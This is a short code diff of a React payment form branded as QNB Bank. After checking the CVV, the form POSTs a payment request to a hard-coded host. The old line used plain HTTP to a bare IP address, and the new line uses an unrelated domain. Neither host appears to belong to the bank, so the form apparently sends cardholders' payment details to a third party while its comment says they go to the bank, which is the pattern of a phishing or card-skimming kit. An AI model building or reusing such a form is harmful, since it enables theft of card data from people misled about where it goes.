@@ -83,8 +83,8 @@ const QNBPaymentForm: React.FC<QNBPaymentFormProps> = ({
         throw new Error('Geçerli bir CVV kodu girin');
       }
 
-      // QNB Bank ödeme API'sine istek gönder
-  const response = await fetch('http://102.133.145.180:3000/payment?action=initiate', {
+    // QNB Bank ödeme API'sine istek gönder
+    const response = await fetch('https://api.securedrive.org/payment?action=initiate', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
